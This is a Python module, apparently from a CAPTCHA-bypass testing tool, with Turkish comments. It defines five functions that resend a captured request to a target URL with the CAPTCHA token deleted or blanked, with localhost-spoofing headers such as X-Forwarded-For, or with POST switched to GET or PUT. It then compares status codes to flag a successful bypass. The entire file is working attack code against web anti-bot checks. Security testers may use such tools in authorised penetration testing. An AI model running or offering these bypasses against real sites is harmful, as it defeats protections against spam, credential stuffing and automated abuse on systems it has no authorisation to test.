import requests as r
from utils.parser import parse_req_headers, params_to_json
from core.findtoken import find_token_json

def bypass_method_1_json(url: str, req: str, token = None):
    # Content-Type'ı JSON olan isteklerde captcha parametresini göndermeyerek bypass etmeye çalışır.
    headers = parse_req_headers(req)
    form_data = params_to_json(req)
    response = r.post(url, form_data, headers)
    if token == None:
        token = find_token_json(req)

    try:
        for key, value in form_data.items():
            if key == token:
                del form_data[key]
                break
            if isinstance(value, dict):
                for nested_key in value.keys():
                    if nested_key == token:
                        del form_data[key][nested_key]
                        break

        new_response = r.post(url, form_data, headers)
        if response.status_code != 403 and response.status_code != 500 and response.status_code == new_response.status_code:
            return 1
        else:
            return 0

    except r.exceptions.HTTPError as e:
        print("Http Error:", e)
    except r.exceptions.ConnectionError as e:
        print("Error Connecting:", e)
    except r.exceptions.Timeout as e:
        print("Timeout Error:", e)
    except r.exceptions.RequestException as e:
        print("OOps: Something Else", e)
    except Exception as e:
        print("Error! ", e)
def bypass_method_2_json(url:str, req: str, token = None):
    # Content-Type'ı JSON olan isteklerde captcha parametresini boş göndererek bypass etmeye çalışır.
    headers = parse_req_headers(req)
    if token == None:
        token = find_token_json(req)
    form_data = params_to_json(req)
    response = r.post(url, form_data, headers)

    try:
        for key, value in form_data.items():
            if key == token:
                form_data[key] = ""
                break
            if isinstance(value, dict):
                for nested_key in value.keys():
                    if nested_key == token:
                        form_data[key][nested_key] = ""
                        break

        new_response = r.post(url, form_data, headers)
        if response.status_code != 403 and response.status_code != 500 and response.status_code == new_response.status_code:
            return 1
        else:
            return 0

    except r.exceptions.HTTPError as e:
        print("Http Error:", e)
    except r.exceptions.ConnectionError as e:
        print("Error Connecting:", e)
    except r.exceptions.Timeout as e:
        print("Timeout Error:", e)
    except r.exceptions.RequestException as e:
        print("OOps: Something Else", e)
    except Exception as e:
        print("Error! ", e)
def bypass_method_3_json(url: str, req: str, token = None):
    # Content-Type'ı JSON olan isteklerde Headerlar kullanılarak bypass etmeye çalışır.
    headers = parse_req_headers(req)
    if token == None:
        token = find_token_json(req)
    form_data = params_to_json(req)
    response = r.post(url, form_data, headers)

    headers["X-Forwarded-Host"] = "127.0.0.1"
    headers["X-Forwarded-For"] = "127.0.0.1"
    headers["X-Originating-IP"] = "127.0.0.1"
    headers["X-Remote-IP"] = "127.0.0.1"
    headers["X-Remote-Addr"] = "127.0.0.1"
    headers["X-Client-IP"] = "127.0.0.1"
    headers["X-Host"] = "127.0.0.1"

    try:
        new_response = r.post(url, form_data, headers)
        if response.status_code != 403 and response.status_code != 500 and response.status_code == new_response.status_code:
            return 1
        else:
            return 0

    except r.exceptions.HTTPError as e:
        print("Http Error:", e)
    except r.exceptions.ConnectionError as e:
        print("Error Connecting:", e)
    except r.exceptions.Timeout as e:
        print("Timeout Error:", e)
    except r.exceptions.RequestException as e:
        print("OOps: Something Else", e)
    except Exception as e:
        print("Error! ", e)
def bypass_method_4_json_get(url:str, req: str, token = None):
    # Content-Type'ı JSON olan isteklerde POST -> GET ile bypass etmeye çalışır.
    headers = parse_req_headers(req)
    if token == None:
        token = find_token_json(req)
    form_data = params_to_json(req)
    response = r.post(url, form_data, headers)
    del headers["Content-Type"]

    try:
        new_response = r.get(url, params=form_data, headers=headers)
        if response.status_code != 403 and response.status_code != 500 and response.status_code != 405 and response.status_code == new_response.status_code:
            return 1
        else:
            return 0

    except r.exceptions.HTTPError as e:
        print("Http Error:", e)
    except r.exceptions.ConnectionError as e:
        print("Error Connecting:", e)
    except r.exceptions.Timeout as e:
        print("Timeout Error:", e)
    except r.exceptions.RequestException as e:
        print("OOps: Something Else", e)
    except Exception as e:
        print("Error! ", e)
def bypass_method_4_json_put(url: str, req: str, token = None):
    # Content-Type'ı JSON olan isteklerde POST -> PUT ile bypass etmeye çalışır.
    headers = parse_req_headers(req)
    if token == None:
        token = find_token_json(req)
    form_data = params_to_json(req)
    response = r.post(url, form_data, headers)

    try:
        new_response = r.put(url, data=form_data, headers=headers)
        if response.status_code != 403 and response.status_code != 500 and response.status_code != 405 and response.status_code == new_response.status_code:
            return 1
        else:
            return 0

    except r.exceptions.HTTPError as e:
        print("Http Error:", e)
    except r.exceptions.ConnectionError as e:
        print("Error Connecting:", e)
    except r.exceptions.Timeout as e:
        print("Timeout Error:", e)
    except r.exceptions.RequestException as e:
        print("OOps: Something Else", e)
    except Exception as e:
        print("Error! ", e)


